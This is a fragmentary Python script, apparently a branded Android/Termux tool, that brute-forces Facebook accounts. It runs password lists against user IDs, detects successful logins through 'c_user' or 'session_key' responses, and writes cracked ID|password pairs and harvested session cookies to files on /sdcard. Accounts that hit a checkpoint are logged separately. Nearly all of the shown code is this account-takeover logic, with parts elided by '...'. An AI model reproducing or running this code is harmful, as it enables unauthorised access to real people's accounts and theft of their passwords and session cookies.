...
　\33[1;35m　　　　∠_,,,/
 MR.VEAR
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31mﾒ٠ṙｴṕ٠ﾒ\33[38;5;196m━━━━━━━━━━━━━━━━━━━━
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m:ﾒ٠ṙｴṕ٠ﾒ
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32mﾒ٠ṙｴṕ٠ﾒ\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [ﾒ٠ṙｴṕ٠ﾒ-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/ﾒ٠ṙｴṕ٠ﾒ-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/ﾒ٠ṙｴṕ٠ﾒ-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ﾒ٠ṙｴṕ٠ﾒ-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ﾒ٠ṙｴṕ٠ﾒ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                ...
                try:
                        ...
                        for pw in passlist:
                             ...
                             'viewport-width': '980',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [ﾒ٠ṙｴṕ٠ﾒ-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ﾒ٠ṙｴṕ٠ﾒ-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [ﾒ٠ṙｴṕ٠ﾒ] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
    ...
    'viewport-width': '980',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/ﾒ٠ṙｴṕ٠ﾒCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    'viewport-width': '980',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ﾒ٠ṙｴṕ٠ﾒ-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/ﾒ٠ṙｴṕ٠ﾒ-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/ﾒ٠ṙｴṕ٠ﾒ_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [KILLER-CP] '+str(uid)+' | '+pas+'\033[1;97m')
